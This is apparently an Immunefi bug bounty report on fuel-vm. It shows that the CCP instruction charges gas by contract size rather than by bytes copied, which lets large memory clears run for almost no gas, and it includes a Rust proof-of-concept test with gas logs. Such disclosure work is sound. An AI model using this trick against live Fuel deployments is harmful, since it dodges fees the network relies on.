# Attackathon \_ Fuel Network 32465 - \[Blockchain\_DLT - High] Abuse of CCP instruction to do cheap memo

Submitted on Sat Jun 22 2024 14:11:33 GMT-0400 (Atlantic Standard Time) by @NinetyNineCrits for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32465

Report type: Blockchain/DLT

Report severity: High

Target: <https://github.com/FuelLabs/fuel-vm/tree/0e46d324da460f2db8bcef51920fb9246ac2143b>

Impacts:

* Modification of transaction fees outside of design parameters

## Description

## Brief/Intro

The `CCP: code copy` instruction charges variable cost dependent on the size of the contract to copy from, but not for the actual amount of bytes to be copied. This can be abused to do cheap memory clears for large memory areas

## Vulnerability Details

The function `code_copy` that is invoked by the `CCP` instruction, loads the target contracts bytecode, charges for its length and then does a copy with zero-fill with a different length parameter:

```rs
pub(crate) fn code_copy(...){

    ...

    dependent_gas_charge_without_base(
        self.cgas,
        self.ggas,
        profiler,
        self.gas_cost,
        contract_len as u64, // <-- charged based on this 
    )?;

    copy_from_slice_zero_fill(
        self.memory,
        self.owner,
        contract.as_ref().as_ref(),
        dst_addr,
        offset,
        length, // <-- amount copied, excess zero-filled
    )?;
```

Any excess amount for the length of bytes gets zero-filled:

```rs
pub(crate) fn copy_from_slice_zero_fill<A: ToAddr, B: ToAddr>(...
    let range = memory.write(owner, dst_addr, len)?;

    let src_end = src_offset.saturating_add(range.len()).min(src.len());
    let data = src.get(src_offset..src_end).unwrap_or_default();

    range[..data.len()].copy_from_slice(data);
    range[data.len()..].fill(0);
```

The slice `data` can be turned into an empty slice (default value) by choosing a large offset. If data is an empty slice the `copy_from_slice` will do nothing. instead the full slice will be zero-filled (identical to a memory clear `MCL`)

## Impact Details

Users can perform an otherwise expensive instruction for almost no cost

## References

not applicable

## Proof of concept

## Proof of Concept

This POC shows the comparison in gas costs of a full memory clear between `MCL` and `CCP`

Add the following test to `fuel-vm/src/tests/flow.rs`:

```rs
#[test]
fn use_ccp_to_memory_clear() {
    let mut test_context = TestBuilder::new(2322u64);
    let gas_limit = 10_000_000;

    let program = vec![
        op::ret(RegId::ZERO), // super short contract
    ];

    let contract_id = test_context.setup_contract(program, None, None).contract_id;

    let (script, _) = script_with_data_offset!(
        data_offset,
        vec![
            op::movi(0x10, data_offset as Immediate18), //pointer to address
            op::sub(0x11, RegId::HP, RegId::SP), //store size of unallocated memory in register 0x11
            op::subi(0x12, 0x11, 1), //pointer to last writeable byte
            op::movi(0x13, 0xff), //value to write
            op::cfe(0x11), //extend the stack to fill the whole memory
            op::log(RegId::CGAS, 0x00, 0x00, 0x00), //log remaining gas

            // following block uses mcl to clear memory:

            op::sb(0x12, 0x13, 0), //write to last writeable byte
            op::lb(0x14, 0x12, 0), //load the value back to check with log
            op::log(0x00, 0x00, 0x00, 0x14), //log the value
            op::mcl(RegId::SSP, 0x11), //clear whole area between SSP and SP
            op::lb(0x14, 0x12, 0), //load last writeable byte to check if it was cleared
            op::log(RegId::CGAS, 0x00, 0x00, 0x14), //log remaining gas and check that value was used

            // following block uses ccp to clear memory:

            op::sb(0x12, 0x13, 0), //repeat write to last writeable byte
            op::lb(0x14, 0x12, 0), //repeat load the value back to check with log
            op::log(0x00, 0x00, 0x00, 0x14), //log the value
            op::ccp(RegId::SSP, 0x10, 0x11, 0x11), //clear whole area between SSP and SP (dst, pointer to contractId, code offset, length)
            op::lb(0x14, 0x12, 0), //load last writeable byte to check if it was cleared
            op::log(RegId::CGAS, 0x00, 0x00, 0x14), //log remaining gas and check that value was used
            
            op::ret(RegId::ONE),
        ],
        test_context.get_tx_params().tx_offset()
    );

    let mut script_data = contract_id.to_vec();
    script_data.extend([0u8; WORD_SIZE * 2]);

    let result = test_context
        .start_script(script, script_data)
        .script_gas_limit(gas_limit)
        .contract_input(contract_id)
        .fee_input()
        .contract_output(&contract_id)
        .execute();

    let receipts = result.receipts();

    //print receipts
    for receipt in receipts.iter() {
        println!("{:?}", receipt);
    }
}
```

The logs emitted by this are:

```
Log { id: 0000000000000000000000000000000000000000000000000000000000000000, ra: 9686444, rb: 0, rc: 0, rd: 0, pc: 10388, is: 10368 }
Log { id: 0000000000000000000000000000000000000000000000000000000000000000, ra: 0, rb: 0, rc: 0, rd: 255, pc: 10400, is: 10368 }
Log { id: 0000000000000000000000000000000000000000000000000000000000000000, ra: 9666291, rb: 0, rc: 0, rd: 0, pc: 10412, is: 10368 }
Log { id: 0000000000000000000000000000000000000000000000000000000000000000, ra: 0, rb: 0, rc: 0, rd: 255, pc: 10424, is: 10368 }
Log { id: 0000000000000000000000000000000000000000000000000000000000000000, ra: 9666255, rb: 0, rc: 0, rd: 0, pc: 10436, is: 10368 }
```

The gas costs for the `MCL` block are: 9686444 - 9666291 = 20153

The gas costs for the `CCP` block are 9666291 - 9666255 = 36

The overhead for the other operations in each block are: 1+1+9+1+9 = 21
